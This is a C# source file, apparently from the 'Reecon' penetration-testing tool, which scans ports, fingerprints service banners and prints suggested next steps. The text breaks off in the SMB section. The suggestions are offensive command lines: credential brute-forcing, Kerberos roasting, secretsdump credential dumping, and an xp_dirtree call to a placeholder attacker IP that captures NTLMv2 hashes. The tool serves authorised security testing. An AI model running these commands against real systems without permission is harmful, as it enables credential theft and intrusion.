using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Reecon
{
    public class Port
    {
        public int Number = -1;
        public string FileName = "";
        public string FriendlyName = "";
    }

    public static class PortInfo
    {
        // For later
        // PortName? PortType?
        // Alphabetical or commonality?
        public enum PortName
        {
            FTP,
            SSH,
            Telnet,
            SMTP,
            DNS,
            HTTP,
            HTTPS,
            POP3,
            RpcBind,
            NETBIOS,
            IMAP,
            LDAP,
            SMB,
            Rsync,
            NFS,
            Squid,
            MySql,
            SVN,
            PostgreSql,
            VNC,
            WinRm,
            Redis,
            AJP13,
            Elasticsearch,
            Minecraft
        }

        private static readonly List<Port> PortInfoList = [];

        // Parse Ports.txt into useful information
        public static void LoadPortInfo()
        {
            var assembly = Assembly.GetExecutingAssembly();
            int embeddedItemCount = assembly.GetManifestResourceNames().Length;
            if (embeddedItemCount == 0)
            {
                Console.WriteLine("Error - Cannot find Ports.txt :<");
                Environment.Exit(0);
            }
            string resource = assembly.GetManifestResourceNames().Single(str => str.EndsWith("Ports.txt"));
            if (!string.IsNullOrEmpty(resource))
            {
                using Stream? stream = assembly.GetManifestResourceStream(resource);
                if (stream == null)
                {
                    throw new Exception("Ports.txt is missing!");
                }
                using StreamReader reader = new(stream);
                string portData = reader.ReadToEnd();
                List<string> portItems = portData.Replace("\r\n", "\n").Split('\n').ToList(); // OS Friendly File Split
                foreach (string port in portItems)
                {
                    string portNumber = port.Split('|')[0];
                    string portFileName = port.Split('|')[1];
                    string portFriendlyName = port.Split('|')[2];
                    if (portNumber.Contains('-'))
                    {
                        int lowPort = int.Parse(portNumber.Split('-')[0]);
                        int highPort = int.Parse(portNumber.Split('-')[1]);
                        for (int j = lowPort; j <= highPort; j++)
                        {
                            Port thePort = new Port()
                            {
                                Number = j,
                                FileName = portFileName,
                                FriendlyName = portFriendlyName,
                            };
                            PortInfoList.Add(thePort);
                        }
                    }
                    else
                    {
                        Port thePort = new Port()
                        {
                            Number = int.Parse(portNumber),
                            FileName = portFileName,
                            FriendlyName = portFriendlyName,
                        };
                        PortInfoList.Add(thePort);
                    }
                }
            }
        }

        public enum PortStatus
        {
            Open,
            Closed,
            TimedOut,
            Error
        }

        public static async Task<(PortStatus Status, string Message)> CheckPortAsync(string ipAddress, int port)
        {
            int timeoutMilliseconds = 2000;
            using (var tcpClient = new TcpClient())
            {
                // Use a CancellationTokenSource for timeout control
                using (var cts = new CancellationTokenSource(timeoutMilliseconds))
                {
                    try
                    {
                        Task connectTask = tcpClient.ConnectAsync(ipAddress, port);
                        await connectTask.WaitAsync(cts.Token);

                        // If ConnectAsync completes without throwing (and wasn't cancelled), the port is open.
                        // Console.WriteLine($"Connection to {ipAddress}:{port} successful.");
                        tcpClient.Close(); // Close immediately as we just wanted to check
                        return (PortStatus.Open, $"Open.");
                    }
                    catch (OperationCanceledException) // Catch cancellation specifically if using CancellationToken directly or WaitAsync
                    {
                        tcpClient.Close();
                        // Console.WriteLine($"Connection to {ipAddress}:{port} explicitly cancelled (likely timeout).");
                        return (PortStatus.TimedOut, $"Connection attempt timed out after {timeoutMilliseconds}ms");
                    }
                    catch (SocketException ex)
                    {
                        tcpClient.Close();
                        // Analyze the SocketErrorCode to determine the status more precisely
                        // Console.WriteLine($"SocketException for {ipAddress}:{port}: {ex.SocketErrorCode} - {ex.Message}");
                        switch (ex.SocketErrorCode)
                        {
                            case SocketError.ConnectionRefused:
                                return (PortStatus.Closed, $"Closed (Connection Refused).");
                            case SocketError.TimedOut: // This might still happen if OS timeout is shorter, but less likely with async control
                                return (PortStatus.TimedOut, $"Filtered or Host Down (OS Timeout).");
                            case SocketError.HostNotFound:
                                return (PortStatus.Error, $"Host '{ipAddress}' not found.");
                            case SocketError.HostUnreachable:
                                return (PortStatus.Error, $"Host '{ipAddress}' unreachable (Network Error).");
                            default:
                                return (PortStatus.Error, $"Port {port} check error: {ex.SocketErrorCode}");
                        }
                    }
                    catch (Exception ex) // Catch other potential exceptions
                    {
                        tcpClient.Close();
                        Console.WriteLine($"Generic Exception for {ipAddress}:{port}: {ex.Message}");
                        return (PortStatus.Error, $"Port {port} check failed: {ex.Message}");
                    }
                } // CancellationTokenSource disposed here
            } // TcpClient disposed here
        }

        public static string ScanPort(string target, int port)
        {
            string toReturn = "";
            // See if the port is in our list of known ports
            if (PortInfoList.Any(x => x.Number == port))
            {
                Port thePort = PortInfoList.First(x => x.Number == port);
                string fileName = thePort.FileName;
                (string PortName, string PortData) portInfo;
                // Make sure the port is open
                (PortStatus Status, string Message) portStatus = CheckPortAsync(target, port).GetAwaiter().GetResult();
                if (portStatus.Status == PortStatus.Open)
                {
                    // No Custom File for it
                    if (fileName == "N/A")
                    {
                        string portHeader = $"Port {thePort.Number} - {thePort.FriendlyName}";
                        Console.WriteLine(portHeader.Recolor(Color.Green) + Environment.NewLine + $"- Reecon currently lacks {thePort.FriendlyName} support" + Environment.NewLine);
                        portInfo.PortName = thePort.FriendlyName;
                    }
                    else
                    {
                        // This was previously done by reflection, but reflection freaks out with AoT / Trimming
                        try
                        {
                            switch (fileName)
                            {
                                case "FTP": portInfo = Ftp.GetInfo(target, port); break;
                                case "SSH": portInfo = Ssh.GetInfo(target, port); break;
                                case "Telnet": portInfo = Telnet.GetInfo(target, port); break;
                                case "SMTP": portInfo = Smtp.GetInfo(target, port); break;
                                case "DNS": portInfo = Dns.GetInfo(target, port); break;
                                case "HTTP": portInfo = Http.GetInfo(target, port); break;
                                case "POP3": portInfo = Pop3.GetInfo(target, port); break;
                                case "RPCBind": portInfo = RPCBind.GetInfo(target, port); break;
                                case "NETBIOS": portInfo = NetBios.GetInfo(target, port); break;
                                case "IMAP": portInfo = Imap.GetInfo(target, port); break;
                                case "LDAP": portInfo = Ldap.GetInfoAsync(target, port).GetAwaiter().GetResult(); break;
                                case "MSSQL" : portInfo = Mssql.GetInfo(target, port); break;
                                case "HTTPS": portInfo = Https.GetInfo(target, port); break;
                                case "SMB": portInfo = Smb.GetInfo(target, port); break;
                                case "Rsync": portInfo = Rsync.GetInfo(target, port); break;
                                case "NFS": portInfo = Nfs.GetInfo(target, port); break;
                                case "Squid": portInfo = Squid.GetInfo(target, port); break;
                                case "MySQL": portInfo = MySql.GetInfo(target, port); break;
                                case "SVN": portInfo = Svn.GetInfo(target, port); break;
                                case "PostgreSQL": portInfo = PostgreSQL.GetInfo(target, port); break;
                                case "VNC": portInfo = Vnc.GetInfo(target, port); break;
                                case "WinRM": portInfo = WinRm.GetInfo(target, port); break;
                                case "Redis": portInfo = Redis.GetInfo(target, port); break;
                                case "AJP13": portInfo = Ajp13.GetInfo(target, port); break;
                                case "Elasticsearch": portInfo = Elasticsearch.GetInfo(target, port); break;
                                case "EPMD" : portInfo = Epmd.GetInfo(target, port); break;
                                case "Minecraft": portInfo = Slp.GetInfo(target, port); break;

                                default: portInfo = ("Unknown", $"- Error - Reecon has not yet implemented {fileName} - Bug Reelix!"); break;
                            }

                            // It apparently closed inbetween our first check and now - Weird!
                            if (portInfo.PortName == "Closed")
                            {
                                Console.WriteLine($"Port {thePort.Number}".Recolor(Color.Green) + " - " + "Closed".Recolor(Color.Red) + Environment.NewLine);
                            }
                            else if (portInfo.PortName != "Done")
                            {
                                Console.WriteLine($"Port {thePort.Number} - {portInfo.PortName}".Recolor(Color.Green) + Environment.NewLine + portInfo.PortData + Environment.NewLine);

                                // Regular scanning done - Now for the additional info
                                try
                                {
                                    string additionalPortInfo = GetAdditionalPortInfo(target, portInfo.PortName, port);
                                    toReturn += additionalPortInfo;
                                }
                                catch (Exception ex)
                                {
                                    Console.WriteLine($"Fatal Error retreiving additional Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Recolor(Color.Red));
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"Fatal Error retreiving Info for port {port} - {ex.Message} - Bug Reelix ASAP!".Recolor(Color.Red));
                        }
                    }
                }
                // Port is not open :(
                else
                {
                    Console.WriteLine($"Port {thePort.Number}".Recolor(Color.Green) + " - " + portStatus.Message.Recolor(Color.Red) + Environment.NewLine);
                }
            }
            else
            {
                // The port is not in our list
                // If a single port has different, but similar matches for a sample banners, duplicate results may appear
                Console.WriteLine($"Unknown Port: {port} - Info may be unreliable / duplicated - Especially for Web Servers");
                // See if we can still figure out what it does based on the banner info
                string portInfo = FindUnknownPortInfo(target, port);
                toReturn = portInfo;
            }
            return toReturn;
        }

        // Figure out what a port is based off its banner
        public static string FindUnknownPortInfo(string target, int port)
        {
            string postScanActions = "";
            // A port I'm not familiar with - Try parse the banner
            List<List<byte>> bannerList = General.MultiBannerGrab(target, port);

            // Remove empty entries
            bannerList.RemoveAll(x => Encoding.UTF8.GetString(x.ToArray()) == "");

            // And dupes (Used some AI here, as getting only distinct items in a List<List<byte>> is annoying
            bannerList = bannerList
                .GroupBy(list => BitConverter.ToString(list.ToArray()))
                .Select(group => group.First())
                .ToList();

            string unknownPortResult = "";

            // No entries at all
            if (bannerList.Count == 0)
            {
                unknownPortResult += $"Port {port} - Empty".Recolor(Color.Green);
                Console.WriteLine(unknownPortResult + Environment.NewLine + "- No Response" + Environment.NewLine);
                return "";
            }

            // Intentionally closed
            foreach (List<byte> bannerBytes in bannerList)
            {
                string bannerString = Encoding.UTF8.GetString(bannerBytes.ToArray());
                unknownPortResult = "";

                // AMQP
                if (bannerString.StartsWith("AMQP"))
                {
                    if (bannerList.Count != 8)
                    {
                        Console.WriteLine("AMQP found with an invalid Banner Byte Count! Bug Reelix");
                        return "";
                    }
                    // First 0-3: AMQP
                    // 4-7: Version
                    if (bannerBytes[4] == 0 && bannerBytes[5] == 0 && bannerBytes[6] == 9 && bannerBytes[7] == 1)
                    {
                        Console.WriteLine("Port " + port + " - AMQP".Recolor(Color.Green) + Environment.NewLine + "- Version 0-9-1" + Environment.NewLine + "- Bug Reelix to finish AMQP decoding..." + Environment.NewLine);
                        // theBanner = General.BannerGrab(ip, port, theBanner); // Need to send the bytes of AMQP0091

                        // Oh gawd....
                        // \u0001\0\0\0\0\u0001?\0\n\0\n\0\t\0\0\u0001?\fcapabilitiesF\0\0\0?\u0012publisher_confirmst\u0001\u001aexchange_exchange_bindingst\u0001\nbasic.nackt\u0001\u0016consumer_cancel_notifyt\u0001\u0012connection.blockedt\u0001\u0013consumer_prioritiest\u0001\u001cauthentication_failure_closet\u0001\u0010per_consumer_qost\u0001\u000fdirect_reply_tot\u0001\fcluster_nameS\0\0\0\u0010rabbit@dyplesher\tcopyrightS\0\0\0.Copyright (C) 2007-2018 Pivotal Software, Inc.\vinformationS\0\0\05Licensed under the MPL.  See http://www.rabbitmq.com/\bplatformS\0\0\0\u0011Erlang/OTP 22.0.7\aproductS\0\0\0\bRabbitMQ\aversionS\0\0\0\u00053.7.8\0\0\0\u000ePLAIN AMQPLAIN\0\0\0\u0005en_US?
                        // https://svn.nmap.org/nmap/nselib/amqp.lua
                        postScanActions += $"- AMQP is up and nmap knows more: nmap --script amqp-info -p{port} {target}" + Environment.NewLine;
                    }
                    // TODO: This probably also broke in the refactor - Need to fix 
                    else
                    {
                        Console.WriteLine($"Port {port} - AMQP".Recolor(Color.Green) + Environment.NewLine + "- Unknown AMQP Version: " + (int)bannerBytes[4] + (int)bannerBytes[5] + (int)bannerBytes[6] + (int)bannerBytes[7] + Environment.NewLine);
                    }
                }
                // Asterisk Call Manager
                else if (bannerString.StartsWith("Asterisk Call Manager"))
                {
                    unknownPortResult += $"Port {port} - Asterisk Call Manager".Recolor(Color.Green) + Environment.NewLine;
                    if (bannerString.Contains('/'))
                    {
                        unknownPortResult += "- Version: " + bannerString.Remove(0, bannerString.IndexOf('/') + 1) + Environment.NewLine;
                    }
                    unknownPortResult += "- Metasploit can verify passwords -> use auxiliary/voip/asterisk_login (It's slow)" + Environment.NewLine;
                    unknownPortResult += "- To Read: https://www.hackingarticles.in/penetration-testing-on-voip-asterisk-server-part-2/";
                    Console.WriteLine(unknownPortResult + Environment.NewLine);
                }
                // FTP / SMTP
                // Both start with a 220 response....
                else if (bannerString.StartsWith("220 ")) // ToUpper for things like pyftpdlib / FreeFloat Ftp Server
                {
                    if (bannerString.ToUpper().Contains("FTP"))
                    {
                        unknownPortResult += $"Port {port} - FTP".Recolor(Color.Green) + Environment.NewLine;
                        unknownPortResult += Ftp.GetInfo(target, port).PortData;
                    }
                    else if (bannerString.ToUpper().Contains("SMTP"))
                    {
                        unknownPortResult = $"Port {port} - SMTP".Recolor(Color.Green) + Environment.NewLine;
                        unknownPortResult += Smtp.GetInfo(target, port);
                    }
                    else
                    {
                        unknownPortResult += $"Port {port} - Either SMTP or FTP".Recolor(Color.Green) + Environment.NewLine;
                        if (bannerString.EndsWith("\r\n"))
                        {
                            unknownPortResult += "- Windows Newline Characters Detected" + Environment.NewLine;
                        }
                        else if (bannerString.EndsWith('\n'))
                        {
                            unknownPortResult += "- Linux Newline Characters Detected" + Environment.NewLine;
                        }
                        else
                        {
                            Console.WriteLine("theBanner - Fatal Error in FTP/SMTP Detection :<");
                            return "";
                        }
                        unknownPortResult += "- Manual Enumeration Required: " + bannerString;

                        // Note: EHLO {IP} with \n for Linux or \r\n for Windows returns something
                    }

                    Console.WriteLine(unknownPortResult + Environment.NewLine);
                }
                // HTTPS
                else if (bannerString == "Reecon - HTTPS")
                {
                    string httpsData = Https.GetInfo(target, port).PortData;
                    if (httpsData != "")
                    {
                        Console.WriteLine(unknownPortResult += $"Port {port} - HTTPS".Recolor(Color.Green) + Environment.NewLine + httpsData + Environment.NewLine);
                        postScanActions += $"- gobuster dir -u https://{target}:{port}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-{port}-medium.txt -x.php,.txt" + Environment.NewLine;
                        postScanActions += $"- gobuster dir -u https://{target}:{port}/ -w ~/wordlists/common.txt -t 25 -o gobuster-{port}-common.txt -x.php,.txt" + Environment.NewLine;
                    }
                    else
                    {
                        Console.WriteLine(unknownPortResult += $"Port {port} - HTTPS".Recolor(Color.Green) + Environment.NewLine + httpsData + Environment.NewLine);
                        Console.WriteLine("- No Data Returned? Bug Reelix!");
                    }
                }
                // Probably a general HTTP or HTTPS web server
                else if (
                    bannerString.Contains("Server: Apache") // Apache Web Server
                    || bannerString.Contains("Server: cloudflare") // Cloudflare Server
                    || bannerString.StartsWith("HTTP/1.1")
                    || bannerString.StartsWith("HTTP/1.0")
                    || bannerString.Contains("Error code explanation: 400 = Bad request syntax or unsupported method.") // BaseHTTP/0.3 Python/2.7.12
                    || bannerString.Contains("<p>Error code: 400</p>") // TryHackMe - Task 12 Day 7
                    || bannerString.Contains("<h1>Bad Request (400)</h1>")
                    || bannerString.Trim().StartsWith("<!DOCTYPE html>") // General HTML
                    )
                {
                    // WinRM - HTTP with special stuff
                    if (bannerString.Contains("Server: Microsoft-HTTPAPI/2.0"))
                    {
                        unknownPortResult += $"Port {port} - WinRM".Recolor(Color.Green);
                        (string PortName, string PortData) portInfo = WinRm.GetInfo(target, port);
                        Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);
                    }
                    else
                    {
                        bool isHttps = Web.BasicHttpsTest(target, port);
                        string httpData = isHttps ? Https.GetInfo(target, port).Item2 : Http.GetInfo(target, port).Item2;
                        if (httpData != "")
                        {
                            string headerText = $"Port {port} - HTTP" + (isHttps ? "S" : "");
                            Console.WriteLine(unknownPortResult += headerText.Recolor(Color.Green) + Environment.NewLine + httpData + Environment.NewLine);
                            postScanActions += "- gobuster dir -u http" + (isHttps ? "s" : "") + $"://{target}:{port}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-" + port + "-medium.txt -x.php,.txt" + Environment.NewLine;
                            postScanActions += "- gobuster dir -u http" + (isHttps ? "S" : "") + $"://{target}:{port}/ -w ~/wordlists/common.txt -t 25 -o gobuster-" + port + "-common.txt -x.php,.txt" + Environment.NewLine;
                        }
                    }
                    break;
                }
                // Minecraft
                else if (bannerBytes[0] == 0xFF && bannerBytes[4] == 0xA7)
                {
                    Console.WriteLine("Possibly Minecraft - Bug Reelix!");
                    Slp.GetInfo(target, port);
                }
                // MySQL
                else if (bannerString.StartsWith('c') && bannerString.Contains("\0mysql_native_password\0"))
                {
                    (string PortName, string PortData) portInfo = MySql.GetInfo(target, port);
                    unknownPortResult += $"Port {port} - {portInfo.PortName}".Recolor(Color.Green);
                    Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);
                    break;
                }
                // POP3 - 1
                else if (bannerString == "+OK Dovecot ready.")
                {
                    unknownPortResult += $"Port {port} - POP3 (Dovecot)".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += Pop3.GetInfo(target, port);
                    Console.WriteLine(unknownPortResult);
                }
                // POP3 - 2
                else if (bannerString.StartsWith("+OK ") && bannerString.Contains("POP3"))
                {
                    unknownPortResult += $"Port {port} - POP3".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += Pop3.GetInfo(target, port);
                    Console.WriteLine(unknownPortResult);
                }
                // Redis
                else if (bannerString == "-ERR unknown command 'Woof'")
                {
                    (string PortName, string PortData) portInfo = Redis.GetInfo(target, port);
                    unknownPortResult += $"Port {port} - {portInfo.PortName}".Recolor(Color.Green);
                    Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);
                }
                // Rsync
                else if (bannerString.StartsWith("@RSYNCD"))
                {
                    unknownPortResult += $"Port {port} - Rsync".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += Rsync.GetInfo(target, port);
                    Console.WriteLine(unknownPortResult);
                }
                // SMTP
                else if (bannerString.StartsWith("220") && bannerString.Contains("ESMTP"))
                {
                    (string PortName, string PortData) portInfo = Smtp.GetInfo(target, port); // Can't just parse the banner directly since there could be other useful stuff
                    unknownPortResult += $"Port {port} - {portInfo.PortName}".Recolor(Color.Green);
                    Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);

                }
                // SSH
                // SSH-2.0-OpenSSH
                // SSH-2.0-Go
                // SSH-2.0-SSH
                else if (bannerString.StartsWith("SSH-2.0-"))
                {
                    unknownPortResult += $"Port {port} - SSH".Recolor(Color.Green) + Environment.NewLine;
                    if (bannerString.Contains("\r\nProtocol mismatch."))
                    {
                        unknownPortResult += Environment.NewLine + "- TCP Protocol Mismatch";
                    }
                    unknownPortResult += Ssh.GetInfo(target, port).PortInfo;
                    Console.WriteLine(unknownPortResult + Environment.NewLine);
                }
                // Squid - HTTP with different special stuff
                else if (bannerString.Contains("Server: squid"))
                {
                    (string PortName, string PortData) portInfo = Squid.GetInfo(target, port);
                    unknownPortResult += $"Port {port} - {portInfo.PortName}".Recolor(Color.Green);
                    Console.WriteLine(unknownPortResult + Environment.NewLine + portInfo.PortData + Environment.NewLine);
                }
                // SVN
                else if (bannerString.Trim().StartsWith("( success ( 2 2 ( ) ( edit-pipeline"))
                {
                    unknownPortResult += $"Port {port} - SVN (Subversion)".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += "- Bug Reelix to fix this. Ref: Port 3690";
                    Console.WriteLine(unknownPortResult);
                }
                // Telnet - Third can be a number of things depending on the protocol - Check Telnet.cs
                
                // This probably broke in the refactor - Need to verify 
                else if (bannerString.Length > 5 && bannerBytes[0] == 255 && bannerBytes[1] == 253)
                {
                    unknownPortResult += $"Port {port} - Telnet".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += Telnet.GetInfo(target, port).PortInfo;
                    Console.WriteLine(unknownPortResult);
                }
                // VNC
                else if (bannerString.StartsWith("RFB "))
                {
                    unknownPortResult += $"Port {port} - VNC".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += Vnc.GetInfo(target, port).PortInfo;
                    Console.WriteLine(unknownPortResult);
                }
                // Windows RPC over HTTP
                else if (bannerString == "ncacn_http/1.0")
                {
                    unknownPortResult += "- Microsoft Windows RPC over HTTP".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += "- Reecon currently lacks Microsoft Windows RPC over HTTP support" + Environment.NewLine;
                    Console.WriteLine(unknownPortResult);
                }
                // XMPP
                else if (bannerString == "</stream:stream>")
                {
                    unknownPortResult += $"Port {port} - xmpp".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += "- Client Name: Wildfire XMPP Client" + Environment.NewLine;
                    Console.WriteLine(unknownPortResult);
                }
                else if (bannerBytes.Count == 10 && bannerBytes[0] == 0xFF && bannerBytes[9] == 0x7F)
                {
                    unknownPortResult += $"Port {port} - zmtp".Recolor(Color.Green) + Environment.NewLine;
                    unknownPortResult += $"- Bug Reelix to get more info" + Environment.NewLine;
                    Console.WriteLine(unknownPortResult);
                }
            }
            // 47538/tcp open  socks-proxy Socks4A
            // -> [?? _ ??

            // It's gone through everything and there's still no regular results
            if (unknownPortResult == "")
            {
                // If there are 2 results and 1 "Closed" - Removed the Closed (Weird edge case...)
                if (bannerList.Count == 2)
                {
                    if (bannerList.Count(x => Encoding.UTF8.GetString(x.ToArray()) == "Reecon - Closed") == 1)
                    {
                        bannerList.RemoveAll(x => Encoding.UTF8.GetString(x.ToArray()) == "Reecon - Closed");
                    }
                }
                if (bannerList.Count == 1)
                {
                    List<byte> bannerBytes = bannerList[0];
                    string bannerString = Encoding.UTF8.GetString(bannerBytes.ToArray());
                    if (bannerString == "Reecon - Connection reset by peer")
                    {
                        unknownPortResult += $"Port {port} - Reset" + Environment.NewLine;
                        unknownPortResult += "- Connection reset by peer (No Useful response)" + Environment.NewLine;
                    }
                    else if (bannerString == "Reecon - Closed")
                    {
                        unknownPortResult += $"Port {port} - Closed".Recolor(Color.Green) + Environment.NewLine;
                        unknownPortResult += "- Port is closed" + Environment.NewLine;
                    }
                    else
                    {
                        unknownPortResult += $"Port {port} - Unknown".Recolor(Color.Green) + Environment.NewLine;
                        unknownPortResult += $"- Unknown Single Response: -->{bannerString}<-- (Len: {bannerBytes.Count})" + Environment.NewLine;
                        if (bannerBytes.Count < 25)
                        {
                            unknownPortResult += $"- Numeric Bytes: {string.Join(",", bannerBytes)}" + Environment.NewLine;
                        }
                        unknownPortResult += $"- TODO: nmap -sC -sV {target} -p{port}" + Environment.NewLine;
                    }
                }
                else
                {
                    unknownPortResult += $"Port {port} - Unknown (Dumping possible outcomes)".Recolor(Color.Red) + Environment.NewLine;
                    // Truly unknown - Find the best result
                    
                    // We're using multiple banner checks, but we should only show the nmap message once if it has a response.
                    bool showNmapResponse = false;
                    foreach (List<byte> theBanner in bannerList)
                    {
                        string bannerString = Encoding.UTF8.GetString(theBanner.ToArray());
                        if (bannerString == "Reecon - Connection reset by peer")
                        {
                            unknownPortResult += "- Connection reset by peer (No Useful response)" + Environment.NewLine;
                        }
                        else if (bannerString == "Reecon - Closed")
                        {
                            unknownPortResult += "- Port is closed" + Environment.NewLine;
                        }
                        else
                        {
                            unknownPortResult += "- Unknown Response: -->" + Encoding.UTF8.GetString(theBanner.ToArray()).Recolor(Color.Orange) + "<--" + Environment.NewLine;
                            showNmapResponse = true;
                        }
                    }

                    if (showNmapResponse)
                    {
                        unknownPortResult += $"- TODO: nmap -sC -sV {target} -p{port}" + Environment.NewLine;
                    }
                }
                Console.WriteLine(unknownPortResult);
            }

            return postScanActions;
        }

        // For the "Some things you probably want to do" list
        public static string GetAdditionalPortInfo(string target, string portName, int port)
        {
            // This currently relies too much on specific ports
            // Need to change it to service name later...
            string postScanActions = "";
            // Additional port info
            if (portName == "ERROR")
            {
                postScanActions += "- Bug Reelix, and investigate this yourself :/" + Environment.NewLine;
            }
            else if (portName == "Telnet")
            {
                postScanActions += "- Telnet: Just telnet in - Bug Reelix to update this though..." + Environment.NewLine;
            }
            // Need to convert the rest of these from numbers to names at some point...
            else if (portName == "DNS")
            {
                // TODO: https://svn.nmap.org/nmap/scripts/dns-nsid.nse
                postScanActions += $"- Try list all records (Linux): dig @{target} domain.com any" + Environment.NewLine;
                postScanActions += $"- Try a reverse lookup (Linux): dig @{target} -x {target}" + Environment.NewLine;
                postScanActions += $"- Try a zone transfer (Linux): dig axfr domain.com @{target}" + Environment.NewLine;
                postScanActions += $@"- Try add a custom record: echo -e 'server {target}\nzone domain.com\nupdate add custom-subdomain.domain.com 600 IN A YOUR_IP\nsend' | nsupdate" + Environment.NewLine;
                postScanActions += $"-- Check if it worked: dig +noall +answer @{target} custom-subdomain.domain.com ANY" + Environment.NewLine;
            }
            else if (portName == "HTTP")
            {
                postScanActions += $"- gobuster dir -u http://{target}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-http-medium.txt -x.php,.txt" + Environment.NewLine;
                postScanActions += $"- gobuster dir -u http://{target}/ -w ~/wordlists/common.txt -t 25 -o gobuster-http-common.txt -x.php,.txt" + Environment.NewLine;

            }
            else if (portName == "Microsoft Windows Kerberos" || portName == "LDAP")
            {
                if (port == 636)
                {
                    // LDAPS doesn't give proper naming contexts
                    postScanActions = "";
                }
                else
                {
                    // Post Scan
                    string defaultNamingContext = "Unknown";
                    try
                    {
                        // It's generally assumed that if 88 is up, 389 is up as well, although it could also be 3268
                        defaultNamingContext = Ldap.GetPlainDefaultNamingContextAsync(target, port).GetAwaiter().GetResult();
                    }
                    catch (Exception ex)
                    {
                        if (ex.InnerException != null && ex.InnerException.ToString().StartsWith("System.DllNotFoundException: Unable to load shared library 'libldap-2.4.so.2'"))
                        {
                            postScanActions += $"- Error: You need a third-party DLL to run LDAP stuff on Linux. Download + dpkg -i https://packages.ubuntu.com/focal-updates/amd64/libldap-2.4-2/download" + Environment.NewLine;
                            postScanActions += $"-- Note: If you're currently an ARM user, you're a bit out of luck: https://github.com/dotnet/runtime/issues/69456" + Environment.NewLine;
                        }
                        else
                        {
                            postScanActions += $"- Error: Unable to retrieve DefaultNamingContext: " + ex.Message + " <--> " + ex.InnerException + Environment.NewLine;
                        }
                    }

                    // Bloodhound Collection
                    postScanActions += $"- LDAP - Bloodhound Collection: nxc ldap {target} -u 'USERNAME' -p 'PASSWORD' --bloodhound --collection All --dns-server {target}" + Environment.NewLine;

                    // Username enum
                    postScanActions += $"- Kerberos Username Enum: kerbrute userenum --dc {target} -d {defaultNamingContext} users.txt (Very very fast - Use xato and wait 10 minutes)" + Environment.NewLine;

                    // Requests TGT (Ticket Granting Tickets) for users
                    postScanActions += $"- Kerberos TGT Request: GetNPUsers.py {defaultNamingContext}/ -dc-ip {target} -request" + Environment.NewLine;

                    // Test for users with 'Do not require Kerberos preauthentication'
                    // The / at the end of defaultNamingContext is not a typo and is required
                    postScanActions += $"- Kerberos non-preauth: GetNPUsers.py {defaultNamingContext}/ -usersfile users.txt -dc-ip {target}" + Environment.NewLine;

                    // Try to find Service Principal Names that are associated with normal user account.
                    postScanActions += $"- Kerberos Associated SPNs (Auth'd): GetUserSPNs.py {defaultNamingContext}/username:\"password\" -request" + Environment.NewLine;

                    // Post exploitation
                    postScanActions += $"- If you get details: python3 secretsdump.py usernameHere:\"passwordHere\"@{target} | grep :" + Environment.NewLine;
                }
            }
            else if (portName == "MSSQL")
            {
                postScanActions += $"- MSSQL - Brute force creds: nxc mssql {target} -u users.txt -p pass.txt" + Environment.NewLine;
                postScanActions += $"- MSSQL - Get Version: nxc mssql {target} -u 'username' -p 'password' -q 'SELECT @@VERSION;'" + Environment.NewLine;
                postScanActions += $"- MSSQL - nxc mssql {target} -u 'username' -p 'password' -M mssql_priv" + Environment.NewLine;
                postScanActions += $"- MSSQL - Nmap has more: sudo nmap {target} -p 1433 --script ms-sql-info" + Environment.NewLine;
                postScanActions += $"- MSSQL - Connect: mssqlclient.py (-windows-auth is optional, but can be required) {target}/userHere:passHere@{target}" + Environment.NewLine;
                postScanActions += $@"- MSSQL - If you connect, run responder, and try get the NTLMv2 hash: nxc mssql {target} -u 'username' -p 'password' --local-auth -q 'exec xp_dirtree ""\\YOUR_IP_HERE\test""' (hashcat -m 5600 - NOT -ssp hashes)" + Environment.NewLine;
                postScanActions += @"- MSSQL - Explore the file system: exec xp_dirtree 'C:\',1,1" + Environment.NewLine;
            }
            else if (portName == "NETBIOS")
            {
                postScanActions += $"- NETBIOS - rpcdump.py @{target} (Probably egrep for 'MS-RPRN|MS-PAR' for the PrintSpooler exploits)" + Environment.NewLine;
            }
            else if (port == 443)
            {
                postScanActions += $"- gobuster dir -u https://{target}/ -w ~/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster-https-medium.txt -x.php,.txt" + Environment.NewLine;
                postScanActions += $"- gobuster dir -u https://{target}/ -w ~/wordlists/common -t 25 -o gobuster-https-common.txt -x.php,.txt" + Environment.NewLine;
            }
            else if (portName == "SMB")
            {
                if (General.GetOperatingSystem() == General.OperatingSystem.Windows)
                {
                    postScanActions += $"- SMB - Linux (SMBClient) has better info on this: smbclient -L {target} --no-pass" + Environment.NewLine;
                }

                postScanActions += $"- SMB - I miss a lot: nmap -sC -sV -p445 {target}" + Environment.NewLine;
                postScanActions += $"- SMB - Timeroast: nxc smb {target} -M timeroast (Hashcat -m 31300)" + Environment.NewLine;
                postScanActions += $"- SMB - Unauthenticated SID (Username) Lookup: lookupsid.py anonymous@{target} -no-pass | grep -e \"Brute forcing\" -e SidTypeUser -e STATUS_LOGON_FAILURE" + Environment.NewLine;
                postScanActions += $"- SMB - Authenticated SID Lookup: lookupsid.py DOMAIN/Username:password@{target}" + Environment.NewLine;
                postScanActions += $"- SMB - Testing passwords: nxc smb {target} -u users.txt -p passwords.txt" + Environment.NewLine;
                postScanActions += $"- SMB - List Shares: smbclient -U validusername%validpass -L //{target}" + Environment.NewLine;
